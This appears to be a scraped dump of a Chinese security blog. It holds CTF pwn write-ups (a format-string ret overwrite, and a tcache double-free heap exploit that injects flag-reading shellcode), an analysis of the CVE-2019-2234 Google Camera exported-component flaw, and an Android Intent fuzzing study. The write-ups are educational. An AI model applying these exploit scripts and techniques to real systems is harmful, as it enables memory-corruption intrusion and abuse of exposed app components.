hex(libc) system = libc + lib.symbols['system'] binsh = libc + lib.search(&quot;/bin/sh\\x00&quot;).next() def inputMsg(msg): sh.sendlineafter(&quot;!&quot;,msg) offset1 = 6 offset2 = 10 written_size = 0 offset = 0 # [+] ebp: 0xffffd718 # [+] target_addr: 0xffffd70c (ret) # [+] libc: 0xf7dfa000 # [+] system: 0xf7e36d10 # [+] binsh: 0xf7f758cf gdb.attach(sh,'b read') position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = 0x8d29 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 2 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = 0x804 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 16 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = system % 0x10000 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 18 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = system &gt;&gt; 16 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 20 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = 0xbeef payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 22 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = 0xdead payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 24 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = binsh % 0x10000 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) offset = 26 position = (target_addr + offset) % 0x10000 payload = &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(offset1) + &quot;$hn\\x00&quot; inputMsg(payload) oneByte = binsh &gt;&gt; 16 payload = &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(offset2) + &quot;$hn\\x00&quot; inputMsg(payload) inputMsg(&quot;wllmmllw&quot;) log.success(&quot;ebp: &quot; + hex(ebp)) log.success(&quot;target_addr: &quot; + hex(target_addr)) log.success(&quot;libc: &quot; + hex(libc)) log.success(&quot;system: &quot; + hex(system)) log.success(&quot;binsh: &quot; + hex(binsh)) sh.interactive()if __name__ == &quot;__main__&quot;: exp() p1Kkheap漏洞类型：tcache_attack漏洞，rwxp段 利用思路：通过tcache来泄露heap_base地址，再通过double free使tcache变为0xff（255） 这题似乎有分预期解，主要说一种。 先来分析程序，保护全开，同时禁了execve和system函数，所以不能通过拿shell来获得flag，并且题目提示，flag位置在当前目录下，于是考虑注入shellcode读取flag文件。 有add，show，edit，delete，exit五个函数。在delete中，free后指针未置为零是一个漏洞点，意味着我们可以在free了以后依旧可以打印出堆块的内容 题目附件中给的libc版本是2.27的，于是尝试考虑tcache attack。 查看题目开心的发现了rwxp段，估计是注入shellcode到该段，在shellcode中读取flag文件内容，然后再在另外地方（用__malloc_hook触发是常识了)设置trigger到该段。 那如何利用tcache呢？ tcache引入了tcache_entry 和 tcache_pertheread_struct两个结构体。其中tcache_perthread_struct 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。 12345678910typedef struct tcache_entry{ struct tcache_entry *next;} tcache_entry;typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];} tcache_perthread_struct; 这里，tcache的具体内容不再展开，但大致可以理解为把他当作高配版的fastbin理解用 ：） 因为tcache内的堆块也是依靠fd来指向前堆块，同时tcache_put()对double free不做检查（虽然现在已经被提了commit） 那我们要做的就是double free使其自己指向自己（即fd位置填上了自己malloc得到的地址，这里是因为tcache相互之间是fd指向fd地址的，结构图参考wiki），然后泄露出fd的内容，即heap_base地址, 这里就不放图了。。 再然后我们刚才提到过，如果能控制tcache_perthread_struct，就可以控制malloc的size和地址了，调试发现，我们之前malloc得到的堆地址距离该结构体相差也不远. 这个结构体也很好判断，2代表了counts数，而在后面存储的即是entries的那些地址。 在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改，那我们再次malloc，通过edit修改fd地址，然后再次malloc抵消之前doublefree的操作，使counts变为0，再次malloc使得counts变为0xff 接下来要尝试泄露__malloc_hook地址，按着结构体来分布，size改为一个大值（虽然已经大于7），然后不要忘了entries是指针（即是堆块），填上0x250-0x40+1， 再在相应地址处填上想放入unsortedbin的堆块地址，当我们再次malloc和free时，因为tcache的个数已经大于七，于是将释放的堆块放入unsortedbin中，这里提醒一个点就是这里tcache attack的堆块都要是small bins（原因看机制），然后我们就可以泄露出malloc hook地址了 接下来和上面类似的操作，但是我们这次给两个entries填上了地址，一个是为了分配到rwxp段，一个是为了待会修改mallochook地址内为rwxp段，以触发shellcode。这个就不再展开了，看exp调一下明白了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/python2.7 # -*- coding: utf-8 -*-from pwn import *context.log_level = &quot;debug&quot;context.terminal = ['tmux','splitw','-h']context.arch = &quot;amd64&quot;elf = ELF(&quot;./p1KkHeap&quot;)lib = 0sh = 0def add(size): sh.sendlineafter(&quot;:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;:&quot;,str(size))def edit(idx,content): sh.sendlineafter(&quot;:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;:&quot;,str(idx)) sh.sendafter(&quot;:&quot;,content)def free(idx): sh.sendlineafter(&quot;:&quot;,&quot;4&quot;) sh.sendlineafter(&quot;:&quot;,str(idx))def show(idx): sh.sendlineafter(&quot;:&quot;,&quot;2&quot;) sh.sendlineafter(&quot;:&quot;,str(idx))def backdoor(content): sh.sendlineafter(&quot;:&quot;,&quot;666&quot;) sh.sendlineafter(&quot;(y or n)&quot;,&quot;y&quot;) sh.sendafter(&quot;start&quot;,content)def debug(): gdb.attach(sh,&quot;x/30xg 0x555555767250&quot;)#0x555555767250def pwn(): global sh global lib sh = process(&quot;./p1KkHeap&quot;) lib = ELF(&quot;./bc.so.6&quot;) add(0x90) free(0) free(0) show(0) sh.recvuntil(&quot;content: &quot;) heap_base = u64(sh.recvuntil(&quot;\\n&quot;,True).ljust(8,&quot;\\x00&quot;)) - 0x260 add(0x90) edit(1,p64(heap_base + 0x10)) add(0x90) add(0x90)#0xff = 255 payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(heap_base + 0x60) edit(3,payload) add(0x90) free(4) show(4) sh.recvuntil(&quot;content: &quot;) libc = u64(sh.recvuntil(&quot;\\x7f&quot;,False).ljust(8,'\\x00')) - 0x70 - lib.symbols['__malloc_hook'] __malloc_hook = libc + lib.symbols['__malloc_hook'] payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(0x66660000) + p64(__malloc_hook) edit(3,payload) add(0x90) payload = shellcraft.open(&quot;flag.txt&quot;) payload += shellcraft.read(3,0x66660100,0x30) payload += shellcraft.write(1,0x66660100,0x30) edit(5,asm(payload)) add(0xa0)# 0x7ffff7dcfc30 __malloc_hook edit(6,p64(0x66660000)) debug() add(0x90) log.success(&quot;heap_base: &quot; + hex(heap_base)) log.success(&quot;libc: &quot; + hex(libc)) sh.interactive()if __name__ == &quot;__main__&quot;: pwn()","link":"/2019/12/16/2019-12-13-swpuctf/"},{"title":"cve-2019-2234组件暴露漏洞分析","text":"前几天学长扔给了我个漏洞去玩玩，上午抽空分析了下。 这个漏洞的分析整体难度不大，是个组件暴露问题，由checkmarx团队发现（说实话感觉这个漏洞有点没意思，大佬就直接掠过吧） 问题出现在google camera上，影响范围是pixel2，pixel3以及三星的部分手机，身边没有该漏洞环境的可复现环境，就在这里分析以下，做个笔记。 checkmarx对此的报道在这：https://www.checkmarx.com/blog/how-attackers-could-hijack-your-android-camera checkmarx提交漏洞的具体时间表： 图一D:\\project\\boke\\Dawuge.github.io\\img\\in-post\\intentfuzz\\1 所以对应着尽可能地去找2019.7.4以前google camera的apk，由于在PC端google play官网下载不了相应的apk，需要在其他类似镜像的网站下载，这里我选了在apkmirror网上下载6.14号更新的apk 图二 直接拖入jadx。按漏洞信息描述是暴露了以下组件，其他应用可以无需任何权限就调用它。 12345678910111213com.google.android.apps.camera.legacy.app.activity.main.CameraActivity com.android.camera.CameraLauncher com.android.camera.CameraActivity com.android.camera.activity.CaptureActivity com.android.camera.VideoCamera com.android.camera.CameraImageActivity com.android.camera.CameraVideoShortcutActivity com.android.camera.CameraDeepLinkActivity com.android.camera.SecureCameraActivity com.google.android.apps.camera.legacy.app.settings.CameraSettingsActivity com.google.android.apps.camera.legacy.app.refocus.ViewerActivity com.google.android.apps.camera.photobooth.activity.PhotoboothActivity com.google.android.libraries.social.licenses.LicenseMenuActivit 直接用jadx展开显示代码包，发现只有com.google.android开头的包名可以直接对应漏洞的描述，可以知道部分组件使用了别名，那就翻看AndroidManifest.xml。 图3 搜索可以定位这几个别名对应的targetactivity. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;activity-alias android:name=&quot;com.android.camera.CameraLauncher&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.main.CameraActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;android.app.shortcuts&quot; android:resource=&quot;@xml/shortcuts&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:name=&quot;com.android.camera.CameraActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.main.CameraActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:label=&quot;@string/image_intent_label&quot; android:name=&quot;com.android.camera.activity.CaptureActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.CaptureActivity&quot; android:visibleToInstantApps=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.IMAGE_CAPTURE&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:label=&quot;@string/video_intent_label&quot; android:name=&quot;com.android.camera.VideoCamera&quot; android:screenOrientation=&quot;user&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.CaptureActivity&quot; android:visibleToInstantApps=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.VIDEO_CAPTURE&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity-alias&gt;&lt;activity-alias android:name=&quot;com.android.camera.CameraImageActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.CameraImageActivity&quot; android:visibleToInstantApps=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.STILL_IMAGE_CAMERA&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.VOICE&quot;/&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.STILL_IMAGE_CAMERA&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt; &lt;data android:scheme=&quot;launch-camera&quot; android:host=&quot;com.google.android.GoogleCamera&quot; android:path=&quot;/still-image&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:name=&quot;com.android.camera.CameraVideoShortcutActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.CameraImageActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.VIDEO_CAMERA&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.VOICE&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:name=&quot;com.android.camera.CameraDeepLinkActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.CameraDeepLinkActivity&quot; android:visibleToInstantApps=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt; &lt;data android:host=&quot;store.google.com&quot; android:path=&quot;/product/pixelcamerateam1&quot;/&gt; &lt;data android:scheme=&quot;http&quot;/&gt; &lt;data android:scheme=&quot;https&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt;&lt;/activity-alias&gt;&lt;activity-alias android:name=&quot;com.android.camera.SecureCameraActivity&quot; android:targetActivity=&quot;com.google.android.apps.camera.legacy.app.activity.SecureCameraActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.STILL_IMAGE_CAMERA_SECURE&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.VOICE&quot;/&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.media.action.IMAGE_CAPTURE_SECURE&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=&quot;com.android.keyguard.layout&quot; android:resource=&quot;@layout/keyguard_widget&quot;/&gt; &lt;meta-data android:name=&quot;android.media.still_image_camera_preview_service&quot; android:value=&quot;com.google.android.apps.camera.prewarm.NoOpPrewarmService&quot;/&gt;&lt;/activity-alias&gt; 发现对应的别名和targetactivity的对应关系是 123456789101112131415com.android.camera.CameraLauncher --&gt; com.google.android.apps.camera.legacy.app.activity.main.CameraActivitycom.android.camera.CameraActivity --&gt; com.google.android.apps.camera.legacy.app.activity.main.CameraActivitycom.android.camera.activity.CaptureActivity --&gt; com.google.android.apps.camera.legacy.app.activity.CaptureActivitycom.android.camera.VideoCamera --&gt; com.google.android.apps.camera.legacy.app.activity.CaptureActivitycom.android.camera.CameraImageActivity --&gt; com.google.android.apps.camera.legacy.app.activity.CameraImageActivitycom.android.camera.CameraVideoShortcutActivity --&gt; com.google.android.apps.camera.legacy.app.activity.CameraImageActivitycom.android.camera.CameraDeepLinkActivity --&gt; com.google.android.apps.camera.legacy.app.activity.CameraDeepLinkActivitycom.android.camera.SecureCameraActivity --&gt; com.google.android.apps.camera.legacy.app.activity.SecureCameraActivity 加上之前无别名的组件，一共是以下activity组件，其中上半部分无别名的组件因为直接android:exported = “true”导致组件直接暴露，同时都没有设置android：permission，下半部分的情况有，android：exported = “ture”直接暴露的，也有组件原来的exported属性是false，但是alias别名对应的组件没有直接设置exported，但是设置了intent-filter，即默认exported为true，但是使其响应的intent需符合intent-filter的所有条件。 1234567891011com.google.android.apps.camera.legacy.app.activity.main.CameraActivity com.google.android.apps.camera.legacy.app.settings.CameraSettingsActivity com.google.android.apps.camera.legacy.app.refocus.ViewerActivity com.google.android.apps.camera.photobooth.activity.PhotoboothActivity com.google.android.libraries.social.licenses.LicenseMenuActivity---------------------------------------------------------------------com.google.android.apps.camera.legacy.app.activity.main.CameraActivitycom.google.android.apps.camera.legacy.app.activity.CaptureActivitycom.google.android.apps.camera.legacy.app.activity.CameraImageActivitycom.google.android.apps.camera.legacy.app.activity.CameraDeepLinkActivitycom.google.android.apps.camera.legacy.app.activity.SecureCameraActivity 说实话，分析到这就感觉到这个漏洞原理应该还是比较简单的，因为它的组件暴露可以直接造成个人隐私泄露影响。具体功能逻辑也比较简单，就是有混淆，上jadx反混淆，遇到奇葩函数时，去jeb里看其smali源码，基本上就能摸清程序的逻辑了。 其利用举个例子，比如这里的com.google.android.apps.camera.legacy.app.activity.CameraImageActivity，我们已经知道com.google.android.apps.camera.legacy.app.activity.main.CameraActivity是主活动了，代码中的字符串已经暴露了它的用途，具体分析不再累述，而看CameraImageActivity发现它是直接调用CameraActivity的，所以说我们只要发出符合CameraImageActivity的intent，那么就可以间接启动CameraActivity进行拍照活动了。 图4图5 再看上面个提到的官方描述时间线，能够体会到该漏洞等级之所以升级也应该得益于checkmarx的exp（即vuln app）构造的好。 看完了一个漏洞，拿一个实例试一下，某订票软件。分析发现其中的一个暴露组件，于是构造intent，先启动程序，然后查看包名，在附上android：name。 12&lt;activity android:name=&quot;com.MobileTicket.wxapi.WXPayEntryActivity&quot; android:exported=&quot;true&quot; android:launchMode=&quot;singleTop&quot; android:screenOrientation=&quot;portrait&quot; android:configChanges=&quot;orientation|screenSize&quot;/&gt;&lt;activity android:name=&quot;com.MobileTicket.wxapi.WXEntryActivity&quot; android:exported=&quot;true&quot; android:taskAffinity=&quot;com.MobileTicket&quot; android:launchMode=&quot;singleTask&quot; android:screenOrientation=&quot;portrait&quot; android:configChanges=&quot;orientation|screenSize&quot;/&gt; 图6图7 2333，居然是个测试组件 到这里想起来之前所看过的一个intent fuzzer，虽然说这工具的威力可能不大（厂商一般都会无视只能引起崩溃的问题），但这里也可当一个工具来学习针对性的fuzz了，具体可以看我之前写过的一篇文章 https://www.anquanke.com/post/id/197083 顺便整理了下其他组件暴露的问题，感觉有点启发，那些组件暴露的问题都只能算是一个切入口，真正鉴定它是否是一个漏洞的标准取决于应用自身的逻辑（即是否是一些敏感功能），颇有点像一条路径上的各个分叉，看顺着分叉能够达到的程度大小就差不多决定了这是否是个漏洞，只不过上面这个漏洞的分支程度不深（一个转换就可以（怪不得这洞没人分析orz））。","link":"/2020/02/24/2020-2-24-CVE-2019-2234/"},{"title":"Intent fuzz(android)","text":"android设备的攻击面 远程攻击面 网络协议 暴露的网络服务 移动技术 客户端 浏览器 web引擎 物理邻接攻击面 GPS 基带 蓝牙 wifi nfc 本地攻击面 文件系统 sockets binder 系统安全方面的攻击方式都可以考虑 物理攻击面 usb adb等 android设备上的模糊测试相对于整个信息安全社区，模糊测试在Android生态圈中并没有受到太多关注，尽管有人公开表示对模糊测试Android系统，但很少有人公开谈论他们具体做了哪些相关的工作，为数不多的公开演讲也仅仅关注单一且有限的攻击面。且直接针对android的高效模糊测试框架尚未建立。整体来讲，android设备上的大量攻击面还未被深入挖掘。 对目标应用做一次成功的模糊测试，大致需要一下4步： 选定目标 生成输入 传递测试用例 监控崩溃 这四步基本上是模糊测试的一个通用思路，其中涉及到的常见方法网络上有大量的文献可查，这里就不再累述。 android fuzz的难点android系统上的模糊测试和其他linux系统上的十分相似，利用unix工具如ptrace，管道，信号以及其他POSIX工具，对于开发出带有集成调试器的高级模糊测试工具时有利的，但很多其他因素又限制了Android上的模糊测试，如非linux组件带来的复杂性，软硬件的看门狗可能会使设备重启，Android系统中程序的依赖性可能会导致系统锁定或者程序故障，同时android设备还面临这一个问题：性能，不论是arm架构的物理设备还是sdk中的仿真器，其较低的性能依然会影响测试效率，除此之外通信速度也会带来问题，总而言之，android系统上有效的模糊测试相较于linux系统上的要难以实现的多，下文具体涉及到的难点再依次展开讲解。 选定目标 android Intent android RIL无线接口层 测试目标选择理由：由于android的攻击面很广，其牵扯到的知识点又繁杂，涉及kernel的模糊测试需要对linux等底层系统足够了解，而对物理接口等设备的模糊测试又或多或少会牵扯到硬件的一些基本知识，本文只是对android的一些攻击面做一个探索，所以暂不选定较为复杂的测试对象。 选择android Intent的理由：Intent相对与android设备来说，是属于较高层次的ipc机制。在写android程序的时候，可以直接设置intent的相关操作和相应参数，且通过intent构造畸形数据去攻击android设备也是黑客常用的手段之一。 目标一：android Intent目标的工作原理，分析和攻击方法 IntentFuzzer工具简介：这个工具是针对Intent的Fuzzer。它通该工具能够针对一个简单组件或者是所有安装组件进行fuzz测试。它也适用于BroadcastReceiver，但针对Service只有较少的覆盖，Service通常更加广泛地应用Binder接口而不是针对IPC的Intent。原版的工具只能针对一个Activity进行fuzz测试，一次不能针对所有的Activity进行测试。MindMac在此基础上进行了一些修改，使其能够针对一个应用的一个简单组件或者是所有组件进行fuzz测试，同时具有区分系统应用和非系统应用的能力。MindMac修改后的版本仅针对Activity、BroadcastReceiver、Service。 但是代码本身却并不复杂，下面简单的介绍下：整个fuzzer的核心代码如下： 其原理是列举出系统上所有公开的、能够从应用获取到的Activity、BroadcastReceiver、Service、Instrumentation、ContentProvider。工具将通过Intent尝试启动所有可以获取到的组件，从而触发某些难以发掘的漏洞。触发一般有两类漏洞，一类是拒绝服务，一类的权限提升。拒绝服务危害性比较低，更多的只是影响应用服务质量；而权限提升将使得没有该权限的应用可以通过Intent触发拥有该权限的应用，从而帮助其完成越权行为。如果该工具能够轻易从外部启动特定应用的内部组件，尤其是有较高权限的组件时，很可能在此处发现漏洞。 下面来细致的分析原有代码以理解整个项目的框架，以便后续对其扩展和改进：为了方便起见，我们先对util包中的Appinfo.java, Componentinfo.java, SerizlizableTest.java, Untils.java四个文件进行基本的分析 Appinfo.java Componentinfo.java SerizlizableTest.java 可以看到这三份代码分别实现了APPinfo类，Componentinfo类，和继承了Serializable接口的SerizlizableTest类，代表的含义又分别是每个app的信息，组件的信息和序列化测试 Untils.java Untils类中有如上图的两个主要方法和一些区分组件类型的标识符，其中getPackageInfo函数的逻辑是调用了content自带的函数去获取已安装的package信息，然后再根据是否是系统app，非系统app和其他，调用fillAppInfo将其信息装入Appinfo类型的数组中 MainActivity.java 主体逻辑很简单，就是根据不同选择去获取相应app的信息或者选项3输出dialog信息所以在startActivity后我们顺着程序的思路就应该转到AppInfoActivity.java了 AppInfoActivity.java 可以看到AppInfoActivity的逻辑先是检测是否是属于app，并另起线程pkgInfoRunnable获取所有app的信息，并设置好相应的Adapter，准备完成之后，发送消息使相应的控件展示出信息，代码最后又是对点击进行监控，然后通过intent转到FuzzerActivity.java。（这里就不再累述AppinfoAdapter类了，就是一个普通的“展示”类） FuzzerActivity.java 其实FuzzerActivity的逻辑也很清晰，首先是获取当前所有的组件类型，然后再调用initView和initTypeSpinner。 initView的逻辑是针对cmpListView组件中的单个条目，短按发送NULL intent，长按发送Serializeable Intent；针对两个按键fuzzAllNullBtn和fuzzAllSeBtn，分别对应发送NULL intent和Serializeable Intent， 而具体的发送方式，可见也就是调用了系统函数而已。 initTypeSpinner是负责初始化Spinner组件的列表的，也就是组件选择列表 至此，基本已将代码主题逻辑分析完毕，具体细节请读者直接阅读源码。可以看到，作者只是大致写了个框架，代码并不复杂。但正当我决定继续深入探究时我发现了IntentFuzzer的论文原作，收录在ASIA CCS论文集中，其引用数也有64，不幸的是这篇论文是收费的。。。。于是我决定适当地对其进行扩展，毕竟我觉得这个工具仍然具有很大的扩展空间，作者还是保持了它的简洁性。 可以扩展的点 发送的intent所包含的数据 发送的方式（Serizlizable或者其他） 效率，并行，自动化 处理错误机制 搜集组件的方式除了这些，扩展点可以从官方文档等地方去寻找，如下面几张从官方文档上截取下来的图：可以看出，一些文档中提醒开发者注意避免的点往往是模糊测试可以考虑去深入的地方 扩展举例：由于时间比较有限，我暂时是对第一项进行了扩展，即对发送的intent变量进行填充，但是因为一开始没有严密考虑intent携带数据之间的联系，以及针对不同app，具有不同的intent接受属性（包括是否是隐式intent等），致使出现了多次intent send failed的状态。这一点可能需要构造更加合理的数据，甚至使用以往的poc以及exploits（据初步调研已经有不少公布了关于intent的poc），后续完善并注意实现扩展点后会将代码放到我的github上。 实验截图：IntentFuzzer主界面 相应的选择一类app进行fuzz，这里也可以看到alipay app的内部组件的封装隐蔽性做的还是很好的，只侦察到内部少数组件。 可以看到夸克的组件就要略差些，发送序列化intent和空intent都有可能导致夸克app停止运行。 当然我们测试的对象怎么能少了铁路12306呢？可以看到发送的intent甚至可以触发其达到其他的组件显示出的界面，让我比较惊讶的是竟然还有H5测试页面和微信支付测试等界面出现，感觉可能是12306官方app自己为了下次测试省力，而没有删去或者隐蔽好支付等相关的测试组件。 这些是实验的部分截图，但可惜的是IntentFuzzer并没有建立完善的错误处理机制，所以一开始对其分析的时候，只能借助于本地的Android Studio等其他工具进行栈回溯之类的操作，效率比较低，这里就不贴图了，但这是一个很值得进行扩展的点，需要自己去编写合理的处理机制，或者调用外部工具API来实现错误分析。 这里再放一个目标二的研究选择android RIL无线接口层的理由：android设备接入网络的底层模块是基带，基带是蜂窝调制解调器制造商使用的固件，用于智能设备连接到蜂窝网络，发送和接收数据，并进行语音通话。而RIL为蜂窝调制解调器提供接口，是Android设备平台中负责移动通信的核心组件。 RIL简介： 负责移动通信中所有具体的业务，是android中极少数可以直接从外界接触到的代码之一，其攻击面可类比服务器上部署的网络服务，从移动网络发送到android设备的所有数据都会经过设备中的RIL，最好的例子便是短信（sms）的接收处理过程。智能手机通用架构图：可以看到分为主处理器和蜂窝调制解调器两个子系统android电话栈图：可分为应用程序，应用程序框架，RIL守护程序和内核级设备驱动四个部分 目标二做到一半停止了，主要原因是做之前没有先进行初步测试，蜂窝调制解调技术早在多年前就已经出现，但是我在新型的4g，5g手机扫描时并没有发现相应的rild进程，或者只有些许，猜测可能是厂商做了更好的封装或者替代？如果要对此拓展的话可能会涉及到各个公司使用的相关协议栈等设计实验。总之，感觉且工程性较大，就暂时搁置了。 参考文献《Android安全攻防权威指南》https://developer.android.google.cn/guide/components/intents-filters?hl=zh_cn#javahttps://developer.android.google.cn/reference/android/content/Intent.html#putExtra(java.lang.String,%20android.os.Parcelable)https://github.com/MindMac/IntentFuzzer 阅读以及翻译的一些论文可以参考我的博客或者一个大佬建的仓库：https://dawuge.github.io/https://github.com/bsauce/Some-Papers-About-Fuzzingand 欢迎交流或者带带弟弟。。。。 总结总的来说，时间比较紧迫，大致花了一天半的时间去阅读源码和搭建环境，感觉收获还是挺多的。这里大致说一下自己的一些想法：首先fuzz这一项技术的考虑，这一次阅读到7 Things to Consider Before Fuzzing a Large Open Source Project这一篇文章，感觉还是写的还是挺实在的，在fuzz之前需要明确自己的目标，fuzz终究是一项工具，应该将其作为我们加快效率的一种手段，就像神经网络一样，是为了更好的完成任务而去做的。其次，明确需要检测什么样的错误，然后根据错误特征去设计处理机制甚至是种子样本的构建。接下来是确定地分类你需要的fuzz工具类型以，尽可能地寻找现有的工具，去生成新的fuzz工具或者新的fuzz思路，当完成一个阶段后，学会考虑现阶段fuzz工具的价值，具体分析后再去重新编写fuzz模块也好，尝试人工挖掘也行，总之一切为了效率：） 最后，学会学习前辈们的思路，站在巨人的肩膀上可以让你前进的更快。然后是另一方面的看法，个人认为fuzz本质说到底只是一个为了提高效率的自动化工具，它的前景是可以预估的，可能最终的效果是安全大脑类型的一种智能化漏洞挖掘技术，其根本上的创新性可能没有太多其他的亮点，这是由fuzz这一项技术本身的性质所决定的，但是在达到这个目标之前，我们还是有很长的路要走，当世界甚至万物开始产生更多人为的联系时，fuzz技术可探寻以及运用的领域也在逐渐增多。","link":"/2020/02/24/2020-2-24-androidfuzz1/"},{"title":"在其他平台放置的文章","text":"这里放置一些我在其他平台发的文章 看雪 cve-2019-2234组件暴露漏洞分析 android安全知识点小结 搭建android内核环境（顺带分析cve-2013-1763） android kernel exploit第二弹 安全客 Android漏洞挖掘之Fuzz初探","link":"/2099/01/01/2099-1-1-cundang/"},{"title":"android安全技术点","text":"移动端安全的东西很多，花样也很多，不论是从硬件架构，操作系统，还是其他安全角度来讲，每接触一项新事物，都有可能需要学习一整个生态内的安全知识。这里整理了一些我自己关于android的一些学习笔记和内容，以铺大饼的形式尽量囊括在入门Android安全所学习过的一些知识点，希望对大家有所帮助。 